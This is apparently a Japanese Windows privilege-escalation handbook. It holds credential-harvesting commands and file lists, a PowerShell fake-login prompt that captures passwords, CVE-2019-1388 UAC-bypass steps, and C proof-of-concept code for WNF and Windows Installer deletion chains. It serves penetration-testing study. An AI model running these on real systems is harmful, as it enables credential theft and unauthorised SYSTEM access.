ユーザーが自分の認証情報、あるいは別のユーザーの認証情報を知っていると思われる場合は、いつでも**入力を求める**ことができます（ただし、クライアントに直接**認証情報**を尋ねるのは非常に**危険**です）。

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **認証情報を含む可能性のあるファイル名**

以前に**パスワード**が**平文**または**Base64**で含まれていたことが確認されているファイル

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe 拡張子なしのファイル名リスト版

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 のデータベースでは、一般に `.psafe3` 拡張子が使われます。一致するファイル名は、暗号化された vault の候補として扱ってください。そのファイルが存在しても、読み取り、ロック解除、保存された認証情報の利用ができるとは限りません。こうしたファイルの保存場所を確認する際は、アクセス可能なユーザープロファイルと、設定済みのファイル共有ルートを調べてください。

読み取り可能な KeePass `.kdbx` も、暗号化された vault の手がかりにすぎません。ロック解除には、実際の master-password と、設定されている key-file やアカウント要素が必要です。認可された調査でエントリ内に LM:NT hash ペアが見つかった場合は、[pass-the-hash](../ntlm/README.md#pass-the-hash) を検討する前に、記載されたアカウントを確認し、NT hash が現在も有効で、対象の NTLM サービスで受け入れられるかを検証してください。vault のエントリだけでは、Administrator または SYSTEM の権限は得られません。リモートサービスへのアクセス、アカウント権限、および別途必要となるサービス実行の手順も満たす必要があります。インベントリには vault のパスと読み取り可否を記録し、データベースや保存された認証情報を出力しないでください。

提案されたファイルをすべて検索してください:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe extensionを使わないSearchコマンドのバリエーション

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### ごみ箱内の認証情報

認証情報を探すため、ごみ箱も確認してください。

アクセス可能なごみ箱のエントリを確認し、削除されたバックアップや構成アーカイブに加え、ファイル名に認証情報が明記されたファイルを探してください。有用な `.7z`、`.zip`、`.rar` のバックアップは、数か月前のもので、ありふれたファイル名が付いている場合があります。Windows は元のパスと削除時刻を `$I` レコードに保存し、削除されたファイルを対応する `$R` エントリとして保存します。アーカイブを開く前に、メタデータと現在のIDに読み取り権限があるかを確認してください。表示される内容はボリューム、ユーザー SID、ファイル権限によって異なるため、一覧が空でも復元可能なバックアップが存在しないとは限りません。アーカイブ名は確認候補であり、有効な秘密情報が含まれている証拠ではありません。

アクセス可能な削除済み `.pfx` は、**コード署名**につながる可能性もあります。アクセス可能な秘密鍵が含まれていれば、その鍵で変更した PowerShell スクリプトに署名できます。[PowerShell では秘密鍵を持つコード署名証明書が必要です](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)。また、[AppLocker の発行元ルールは署名者のIDとルールの適用範囲を評価します](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)。別アカウントで実行するには、現在のIDが対象スクリプトそのものを変更できること、実効ルールがそのスクリプトと対象アカウントに対して変更後の署名を許可すること、そしてスケジュールされたタスクなど、より高い権限を持つ実行主体が実際にそのスクリプトを実行することが必要です。`.pfx` というファイル名、証明書のサブジェクト、またはスクリプトへの書き込み権限だけでは、この一連の条件が成立するとは限りません。秘密鍵のデータを開いたりタスクを実行したりする前に、メタデータ、ACL、ポリシー、スケジュールされたコマンドを確認してください。

アクセス可能なメッセージングクライアントのプロファイルデータベース、メモ、受信ファイルも確認し、認証情報につながるものを探してください。BitLocker 回復キーのエクスポートは HTML または TXT として保存されている場合があり、名前付きのバックアップアーカイブ内に含まれていることもあります。このようなファイルから、古いバックアップを含む別の暗号化データボリュームにアクセスできる場合があります。ボリュームとアーカイブを調べるのは、アクセスが許可されている場合に限ってください。バックアップに `NTDS.dit` が含まれている場合、オフラインでドメイン認証情報を復元するには、[バックアップおよび特権グループのワークフロー](../active-directory-methodology/privileged-groups-and-token-privileges.md)で説明されているように、対応する `SYSTEM` ハイブも必要です。ファイル名やロックされたボリュームだけでは、使用可能な回復キーやドメインバックアップが存在するとは限りません。

複数のプログラムに保存された**パスワードを復元する**には、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報が格納されている可能性のあるその他のレジストリキー**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**レジストリからOpenSSHキーを抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**Chrome または Firefox** のパスワードが保存されている dbs を確認してください。\
**Chrome、Edge、または Firefox** のパスワードが保存されている dbs を確認してください。\
また、ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが**保存されている可能性があります。

現在のユーザーの標準的な Edge **Default** プロファイルでは、`Login Data` は `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` にあり、`Local State` はその親ディレクトリである `User Data` にあります。[Microsoft はデフォルトのプロファイルの場所を文書化しています](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)。別のプロファイルや `UserDataDir` ポリシーによって、場所が変更されていることもあります。ファイルが存在するだけでは、認証情報ストアがある可能性を示すにすぎません。ファイルを読み取れること、該当ユーザーの DPAPI コンテキストまたはその他の許可されたキー素材を利用できること、保存されたログイン情報がより高い権限を持つアカウントに属することを確認してください。パスのみを列挙する場合、データベースを開いたり、復号したパスワードを表示したりする必要はありません。

Firefox については、[Mozilla の文書](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile)によると、プロファイル内の `key4.db` と `logins.json` は、キーと暗号化されたログイン情報の対になったファイルです。これらのファイルが存在するだけでは、可能性を示すにすぎません。両方のファイルを読み取れるか、保存されたエントリがあるか、キーが Primary Password で保護されているかを確認してから、認証情報を利用できると判断してください。復元した認証情報がドメインアカウントのものである場合は、そのアカウントの実効的なグループ制御権限と、そのグループの [LAPS パスワードの読み取り権限または復号権限](../active-directory-methodology/laps.md)をそれぞれ確認してください。ブラウザーの痕跡だけでは、管理者権限を得られる経路があるとは判断できません。

ブラウザーからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は、異なる言語で作成されたソフトウェアコンポーネント間の**相互通信**を可能にする、Windows オペレーティングシステムに組み込まれた技術です。各 COM コンポーネントは**クラス ID (CLSID) によって識別され**、各コンポーネントは、インターフェイス ID (IID) によって識別される1つ以上のインターフェイスを通じて機能を提供します。

COM クラスとインターフェイスは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** の下で定義されています。このレジストリは、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** を統合して作成されます = **HKEY\CLASSES\ROOT.**

このレジストリの CLSID 内には、子レジストリ **InProcServer32** があります。ここには、**DLL** を指す**既定値**と、**Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、**Neutral** (Thread Neutral) のいずれかを指定する **ThreadingModel** という値が含まれています。

![ブラウザーの履歴 - COM DLL Overwriting: このレジストリの CLSID 内には、子レジストリ InProcServer32 があります。ここには、DLL を指す既定値と、値...](<../../images/image (729).png>)

基本的に、実行される DLL のいずれかを**上書き**できる場合、その DLL が別のユーザーによって実行されるなら、**権限昇格**が可能です。

攻撃者が永続化の手段として COM Hijacking をどのように利用するかについては、以下を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリ内の汎用的なパスワード検索**

**ファイルの内容を検索**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**特定のファイル名を持つファイルを検索する**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**レジストリでキー名とパスワードを検索する**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は私が作成した msf** プラグインで、被害者のシステム内で認証情報を検索するすべての Metasploit POST module を**自動的に実行**します。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで紹介されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出するためのもう1つの優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、データを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の**セッション**、**ユーザー名**、**パスワード**を検索します。

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

**SYSTEM として実行中のプロセスが、フルアクセス権で新しいプロセスを開く** (`OpenProcess()`) とします。同じプロセスが、**低い権限で新しいプロセスを作成し** (`CreateProcess()`)、**メインプロセスのすべてのオープンハンドルを継承させます**。\
その後、**低権限プロセスへのフルアクセス権**を持つ場合、`OpenProcess()` で作成された**特権プロセスへのオープンハンドル**を取得し、**shellcode を inject** できます。\
この脆弱性の**検出方法と悪用方法**については、[こちらの例を参照してください。](leaked-handle-exploitation.md)\
**異なる権限レベルで継承される、プロセスやスレッドのその他のオープンハンドル（フルアクセス権に限らない）をテストして悪用する方法**については、[こちらの投稿](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)で詳しく解説しています。

## Named Pipe Client Impersonation

**pipe** と呼ばれる共有メモリセグメントにより、プロセス間での通信やデータ転送が可能になります。

Windows には **Named Pipes** という機能があり、別々のプロセス間で、異なるネットワークを介する場合も含め、データを共有できます。これはクライアント／サーバー構成に似ており、役割は **named pipe server** と **named pipe client** に分かれます。

**client** が pipe 経由でデータを送信すると、pipe を設定した **server** は、必要な **SeImpersonate** 権限があれば、**client の ID を偽装**できます。偽装可能な pipe を介して通信する**特権プロセス**を見つければ、自分で設定した pipe とそのプロセスがやり取りした際に、その ID を採用して**より高い権限を得る**機会になります。この攻撃の実行方法については、[こちら](named-pipe-client-impersonation.md)と[こちら](#from-high-integrity-to-system)に参考となるガイドがあります。

また、次のツールを使うと、**burp のようなツールで named pipe の通信を intercept できます:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。**こちらのツールでは、すべての pipe を一覧表示して確認し、privescs を探せます:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv のリモート DWORD write による RCE

サーバーモードの Telephony サービス (TapiSrv) は `\\pipe\\tapsrv` (MS-TRP) を公開します。リモートの認証済みクライアントは、mailslot ベースの非同期イベント経路を悪用し、`ClientAttach` を通じて `NETWORK SERVICE` が書き込み可能な既存ファイルに対する任意の **4-byte write** を実行できます。その後、Telephony の管理者権限を取得し、任意の DLL をサービスとして読み込ませることができます。全体の流れは次のとおりです。

- `pszDomainUser` に書き込み可能な既存パスを設定して `ClientAttach` を呼び出すと、サービスは `CreateFileW(..., OPEN_EXISTING)` でそのファイルを開き、非同期イベントの書き込みに使用します。
- 各イベントは、`Initialize` の攻撃者が制御する `InitContext` をそのハンドルに書き込みます。`LRegisterRequestRecipient` (`Req_Func 61`) で line app を登録し、`TRequestMakeCall` (`Req_Func 121`) を実行してから、`GetAsyncEvents` (`Req_Func 0`) で取得します。その後、登録解除／シャットダウンを行うことで、決定的な書き込みを繰り返せます。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加して再接続し、任意の DLL パスを指定して `GetUIDllName` を呼び出すと、`NETWORK SERVICE` として `TSPI_providerUIIdentify` を実行できます。

詳細:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### Windows で実行可能なファイル拡張子

**[https://filesec.io/](https://filesec.io/)** を確認してください。

### Markdown renderer 経由の Protocol handler / ShellExecute abuse

`ShellExecuteExW` に渡されるクリック可能な Markdown リンクは、危険な URI handler (`file:`、`ms-appinstaller:`、または登録済みの任意の scheme) を起動し、現在のユーザーとして攻撃者が制御するファイルを実行する可能性があります。詳細:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードを探すためのコマンドライン監視**

ユーザーとして shell を取得したとき、**コマンドラインで認証情報を渡す**スケジュール済みタスクやその他のプロセスが実行されている場合があります。以下のスクリプトは2秒ごとにプロセスのコマンドラインを取得し、現在の状態と前回の状態を比較して、差分を出力します。

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効な場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーからターミナルや「NT\AUTHORITY SYSTEM」などの別のプロセスを実行できます。

これにより、同じ脆弱性を利用して、権限昇格と UAC のバイパスを同時に行うことができます。また、何かをインストールする必要はなく、処理中に使用されるバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムには、次のものがあります。

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

この脆弱性を悪用するには、以下の手順を実行する必要があります：

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

必要なファイルと情報は、以下の GitHub リポジトリにすべてあります。

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level への昇格 / UAC Bypass

**Integrity Levels を学ぶには、こちらを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses を学ぶには、こちらを読んでください:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Served Root への Upload Directory Junctions

アプリケーションが予測可能な upload サブディレクトリを作成し、呼び出し元から渡されたファイル名でそこにファイルを書き込んだ後、そのファイルを処理する場合があります。低権限ユーザーがサーバー側の書き込みより前にそのサブディレクトリを削除し、NTFS junction に置き換えられると、書き込みが junction をたどって Web で公開されるディレクトリに到達する可能性があります。そこに置かれたスクリプトは、サーバーがそのファイル形式を実行する場合、Web サービスの identity で実行される可能性があります。これはアプリケーション固有の任意書き込み境界であり、upload directory が書き込み可能であることや junction がすでに存在することだけでは、その存在を証明できません。

upload handler での正確なパス構築とタイミング、サブディレクトリに対するユーザーの実効的な削除・作成権限、宛先の実効 ACL、書き込み側が reparse point をたどるかどうか、そして Web サーバーが宛先のファイルを実行するかどうかを確認してください。書き込み側と Web サーバーのプロセス identity は、それぞれ別に確認してください。受動的なインベントリからディレクトリ ACL と reparse metadata は確認できますが、handler の動作や将来の junction swap の発生までは判定できません。実行がサービスアカウントで行われる場合、別の token-privilege 経路を検討する前に、**実際のプロセストークン**を調べてください。

## WNF でトリガーされる、特権付き scheduled task のクリーンアップ

手動実行を拒否する scheduled task でも、権限のないユーザーがトリガーできる場合があります。特権付き task を監査するときは、XML をエクスポートして、task DACL、principal、action だけでなく、**すべての** trigger を調べてください。特に、`WnfStateChangeTrigger` は Windows Notification Facility (WNF) の state を指定します。その保護可能な state で現在のユーザーによる更新の公開が許可されている場合、`<AllowStartOnDemand>false</AllowStartOnDemand>` であっても、ユーザーは設定された identity で間接的に task を開始できます。<sup>[[43]](#references)</sup>

たとえば Recall の `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task は SYSTEM として実行され、標準ユーザーからの WNF state `7508BCA32C079E41` の更新を受け付け、Recall が無効になっていても `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` を調べていました。<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

到達可能性をテストするには、`ntdll.dll` から `ZwUpdateWnfStateData` を解決し、8 バイトの state name に空の更新を送信して、戻りステータスをタスクの最終実行データまたは Procmon のアクティビティと照合します。以下の簡略化したプローブでは、Recall タスクの例にあるバイト列を使用しています。テスト対象のタスク用にエクスポートされたバイトに置き換えてください。<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### 再帰的なクリーンアップを悪用した特権削除

有用なプリミティブはトリガー単独ではなく、攻撃者が制御するディレクトリを受け取る特権クリーンアップルーチンです。列挙から最終的な変更まで処理を追跡してください。プロファイル／セッションの検出、ワイルドカードで選択された子要素、`SHCreateItemFromParsingName`、`IFileOperation::DeleteItem` は、事前にチェックされたパス名が後で再帰的にたどられることを示す強い兆候です。子孫が信頼できるディレクトリハンドルを基準に開かれ、削除前に検証されない場合、攻撃者は列挙から使用までの間にパス解決を変更できます。<sup>[[43]](#references)</sup>

WNF トリガーを、以下で説明する[oplock、junction、Object Manager symlink の置き換え](#from-folder-contents-delete-to-system-eop)と組み合わせます。oplock によって、正規の子要素が選択された後でクリーンアップ処理を一時停止させ、その間に書き込み可能な祖先ディレクトリを置き換えます。再開後、特権による削除処理は `\RPC Control` 経由で保護対象を解決します。Recall のチェーンでは、これにより、文書化されている MSI rollback 手法に必要な `C:\Config.Msi` の SYSTEM による削除が実現しました。<sup>[[31]](#references)[[43]](#references)</sup>

### ネストされた子孫は浅い reparse point 対策を回避する

攻撃者が制御するルートとその直下の子要素だけを検証しても、再帰的なパス名ベースの削除を安全にはできません。検証済みのオブジェクトは正規のままにして、junction/oplock の置き換えをさらに下の子要素に移します。すると、`IFileOperation::DeleteItem` は最終的に未検証の子孫に到達し、新しいターゲットをたどります。CVE-2026-20941 は、Recall の最初のパッチで `UKP` と GUID 形式のディレクトリを検証しながら、従来の再帰削除処理を残したことで、まさにこの種の不完全な修正が原因となって発生しました。<sup>[[43]](#references)</sup>

安全なパターンは、**すべての子孫**をすでに信頼できるディレクトリハンドルを基準に開き、最終的に解決されたパス／オブジェクトを取得して検証し、その検証済みハンドルに削除 disposition を適用することです。プレフィックスを検証した後、再帰的なパス名ベースの削除に戻ってはいけません。パッチレビューでは、実際の呼び出し箇所における構造体も確認してください。このケースでは、`NtCreateFile` における `OBJECT_ATTRIBUTES` を実行時に調べたところ、`RootDirectory` が null ではなく、相対パス名 `{GUID}\\secure_file.lock` が指定されていることが分かりました。これにより、2つ目の `FILE_DELETE_ON_CLOSE` プリミティブがあると示唆する、誤解を招く逆コンパイラの出力が否定されました。<sup>[[43]](#references)</sup>

## 任意のフォルダーの削除／移動／名前変更から SYSTEM EoP へ

この手法は、exploit code が[**こちら**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)で公開されている[**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されています。<sup>[[31]](#references)[[32]](#references)</sup>

この攻撃は基本的に、Windows Installer の rollback 機能を悪用して、アンインストール処理中に正規ファイルを悪意のあるファイルに置き換えます。そのために攻撃者は、**悪意のある MSI installer**を作成し、`C:\Config.Msi` フォルダーを乗っ取る必要があります。このフォルダーは後に Windows Installer が他の MSI package のアンインストール中に rollback ファイルを保存するために使用します。その rollback ファイルを改変して、悪意のある payload を含ませます。

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

低権限のクライアントは、`CMsiConfigurationManager` COM object (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) を通じて、SYSTEM 権限で動作する `msiexec.exe` サービスにアクセスできます。リバースエンジニアリングにより、関連する `IMsiServer` 呼び出しは、vtable offset `0xA0` の `MsiBeginTransactionW`、`0xC8` の `SetEEUIDirectoryAndFilter`、`0x50` の `CleanupTempPackages` と特定されました。これらの名前と offset はリバースエンジニアリングによるもので、build によって異なる場合があります。<sup>[[41]](#references)</sup>

非管理者の場合、`SetEEUIDirectoryAndFilter` は、指定されたパスを `DELETE`、`FILE_FLAG_BACKUP_SEMANTICS`、`FILE_FLAG_OPEN_REPARSE_POINT` を指定して開く間だけ呼び出し元を impersonate します。これにより、呼び出し元がディレクトリを削除できることが確認され、reparse point をたどることも回避されます。しかし、チェック済みの file object が後続のクリーンアップに結び付けられるわけではなく、Windows Installer がそのオブジェクトを作成したことが証明されるわけでもありません。<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` の後、`SetEEUIDirectoryAndFilter` は、呼び出し元の filter 引数に関係なく、パスをフォルダーとして登録します。サービスは `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` の下に名前付き `REG_DWORD` 値を書き込みます。値名は呼び出し元が制御するパスで、データ `0x00000002` はフォルダーのフラグです。その後、`CleanupTempPackages(NULL, FALSE)` が直接クリーンアップを開始します。昇格された worker はレジストリ値を列挙し、フォルダーのエントリをパスの出所を確認せずに再帰的な `FDeleteFolder` に渡します。通常の削除に失敗すると、コードはさらに `LockdownPath` を呼び出し、ファイル属性をクリアして再試行します。<sup>[[41]](#references)</sup>

`msi.dll` から特定された最小限の呼び出しシーケンスは次のとおりです。<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

有用な primitive は junction によるリダイレクトではなく、パスの再利用です。攻撃者が作成した `C:\Config.Msi` を登録して削除し、その後 Windows Installer に同じパス名を保護された rollback データとともに再作成させます。クリーンアップ処理は古い `TempPackages` の名前を信頼し、新しいディレクトリを SYSTEM として削除します。reparse point は必要ないため、この手法は `FILE_FLAG_OPEN_REPARSE_POINT` とリダイレクト信頼性の緩和策が意図する境界を回避します。<sup>[[41]](#references)</sup>

